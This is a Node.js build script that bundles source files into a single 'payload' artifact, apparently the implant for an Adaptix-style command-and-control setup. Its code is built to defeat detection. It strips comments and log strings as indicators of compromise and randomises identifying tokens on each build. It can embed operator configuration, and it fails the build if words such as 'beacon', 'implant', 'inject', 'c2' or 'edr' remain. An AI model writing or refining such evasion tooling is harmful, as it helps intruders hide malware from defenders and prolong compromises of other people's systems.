#!/usr/bin/env node
// build_payload.js — bundle src/ into ONE self-contained artifact.
//
// Shipped-artifact hygiene (hard rule — src/ is commented for humans, the
// target only ever sees the transformed bundle):
//   1. comments stripped (all of them)
//   2. log(...) call LINES physically removed (dev logging never ships as
//      string literals — quiet-mode off is not enough, the strings are IoCs)
//   3. telltale tokens renamed per build: __LOIS_BAKED__ global, LOIS_ env
//      prefix, lois.config.json sidecar name
//   4. optional esbuild minify pass (identifier mangling) when a local
//      esbuild binary is available (tools/esbuild or PATH)
//
// test/run_tests.js greps the artifact against a word denylist — a comment or
// marker that escapes these transforms fails the suite.
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');

const ROOT = path.join(__dirname, '..');
const SRC = path.join(ROOT, 'src');
const DIST = path.join(ROOT, 'dist');
const ENTRY = 'entry';

const args = process.argv.slice(2);
const arg = (n, d) => { const i = args.indexOf('--' + n); return i >= 0 && args[i + 1] ? args[i + 1] : d; };
const has = (n) => args.includes('--' + n);

// ---- per-build neutral tokens ------------------------------------------------
const FIXED = has('fixed-tokens'); // deterministic tokens for tests/dev loops
const LETTERS = 'ABCDEFGHJKMNPQRSTUVWXYZ'; // env prefixes must start with a letter
const randLetters = (n) => Array.from(crypto.randomBytes(n)).map((b) => LETTERS[b % LETTERS.length]).join('');
const TOK = FIXED ? { baked: '__lwcfg__', envPrefix: 'LW_', sidecar: 'support.json' } : {
  baked: '__' + crypto.randomBytes(3).toString('hex') + '__',   // global cfg hook
  envPrefix: randLetters(4) + '_',                              // env vars (letter-led)
  sidecar: arg('sidecar-name', 'support.json'),                 // config filename
};

// ---- bundler (hand-rolled CJS concat — runtime has ZERO npm deps) -----------
function scan() {
  const mods = {};
  for (const f of fs.readdirSync(SRC)) {
    if (!f.endsWith('.js')) continue;
    mods[path.basename(f, '.js')] = fs.readFileSync(path.join(SRC, f), 'utf8');
  }
  return mods;
}
function depsOf(code) {
  const out = new Set();
  const re = /require\(\s*(['"])\.\/([\w-]+)\1\s*\)/g;
  let m; while ((m = re.exec(code))) out.add(m[2]);
  return [...out];
}
function topoSort(mods, root) {
  const order = [], seen = new Set(), stack = [[root, false]];
  while (stack.length) {
    const [name, done] = stack.pop();
    if (done) { order.push(name); continue; }
    if (seen.has(name)) continue;
    seen.add(name); stack.push([name, true]);
    for (const d of depsOf(mods[name])) {
      if (!mods[d]) throw new Error(`module "${name}" requires missing "./${d}"`);
      if (!seen.has(d)) stack.push([d, false]);
    }
  }
  return order;
}

// ---- hygiene transforms (style rules they rely on are enforced by tests) ----
function hygiene(code) {
  // 1. /* ... */ block comments (none of our sources put them inside strings)
  code = code.replace(/\/\*[\s\S]*?\*\//g, '');
  // 2. comments: full-line, and trailing after whitespace-before-// (our
  //    sources never write ' //' inside a string literal — style rule,
  //    enforced by the hygiene test)
  code = code.replace(/^[ \t]*\/\/[^\n]*$/gm, '');
  code = code.replace(/[ \t]+\/\/[^\n]*$/gm, '');
  // 3. dev log lines: every log(...) call is a single full statement line
  code = code.replace(/^[ \t]*log\([\s\S]*?\);\s*$/gm, '');
  // 4. token renames
  code = code.split('__LOIS_BAKED__').join(TOK.baked);
  code = code.split('LOIS_').join(TOK.envPrefix);
  code = code.split('lois.config.json').join(TOK.sidecar);
  code = code.split('LOIS').join('lw'); // remaining brand mentions (log prefix etc.)
  // collapse the blank lines the strips left
  code = code.replace(/\n{3,}/g, '\n\n');
  return code;
}

function emit(mods, order) {
  const head =
`(function (realRequire, bundleDirname) {
  'use strict';
  const __modules = Object.create(null);
  function __define(name, factory) { __modules[name] = { factory: factory, inst: undefined }; }
  function __require(name) {
    const m = __modules[name];
    if (!m) throw new Error('missing module "' + name + '"');
    if (m.inst === undefined) {
      const module = { exports: {} };
      m.inst = null;
      const localRequire = function (spec) {
        if (spec.charAt(0) === '.') return __require(spec.replace(/^\\.\\/?/, ''));
        return realRequire(spec);
      };
      m.inst = m.factory(localRequire, module, module.exports, bundleDirname) || module.exports;
    }
    return m.inst;
  }
`;
  const parts = [head];
  for (const name of order) {
    const body = hygiene(mods[name].replace(/\r\n/g, '\n'));
    parts.push(`  __define(${JSON.stringify(name)}, function (require, module, exports, __dirname) {\n`);
    parts.push(body);
    parts.push(`\n  });\n`);
  }
  parts.push(`  __require(${JSON.stringify(ENTRY)});\n})(require, __dirname);\n`);
  return parts.join('');
}

function findEsbuild() {
  const cands = [
    path.join(ROOT, '..', 'Adaptix-custom', 'tools', 'esbuild', 'esbuild'),
    '/projects/tools/esbuild/esbuild',
    'esbuild',
  ];
  for (const c of cands) {
    const r = spawnSync(c, ['--version'], { encoding: 'utf8' });
    if (!r.error && r.status === 0) return c;
  }
  return null;
}

// ---- main --------------------------------------------------------------------
(function main() {
  fs.mkdirSync(DIST, { recursive: true });
  const mods = scan();
  const order = topoSort(mods, ENTRY);

  // --bake <config.json>: embed operator config (priority: env > sidecar > baked)
  let bakePre = '';
  const bakeIdx = args.indexOf('--bake');
  if (bakeIdx >= 0) {
    const f = args[bakeIdx + 1];
    const baked = JSON.parse(fs.readFileSync(f, 'utf8'));
    bakePre = `globalThis.${TOK.baked} = ${JSON.stringify(baked)};\n`;
    console.log('[build] baked config keys: ' + Object.keys(baked).join(', '));
  }

  let bundle = bakePre + emit(mods, order);
  const plainPath = path.join(DIST, arg('name', 'bundle') + '.js');
  fs.writeFileSync(plainPath, bundle);
  console.log(`[build] plain -> ${plainPath} (${bundle.length} bytes)`);

  if (!has('no-min')) {
    const esb = findEsbuild();
    if (esb) {
      const r = spawnSync(esb, ['--minify', '--platform=node', '--target=node18'],
        { input: bundle, encoding: 'utf8', maxBuffer: 64 << 20 });
      if (r.status === 0) {
        fs.writeFileSync(plainPath, r.stdout);
        console.log(`[build] minified (${r.stdout.length} bytes)`);
      } else console.log('[build] esbuild failed, kept plain: ' + r.stderr.slice(0, 200));
    } else {
      console.log('[build] esbuild not found — shipping comment-stripped plain bundle (pass --no-min to silence)');
    }
  }

  // hygiene self-check on the shipped bytes (the <<<PAYLOAD_DATA>>> marker is
  // protocol-required by the stock listener template — exempt it from the scan)
  const shipped = fs.readFileSync(plainPath, 'utf8').replace('<<<PAYLOAD_DATA>>>', '');
  const denied = ['lois', 'beacon', 'adaptix', 'implant', 'inject', 'c2 ', ' edr', 'airlock'];
  const hits = denied.filter((w) => shipped.toLowerCase().includes(w));
  if (hits.length) {
    console.error('[build] HYGIENE FAIL — denylist words in artifact: ' + hits.join(', '));
    process.exit(1);
  }
  console.log('[build] hygiene check clean');
})();
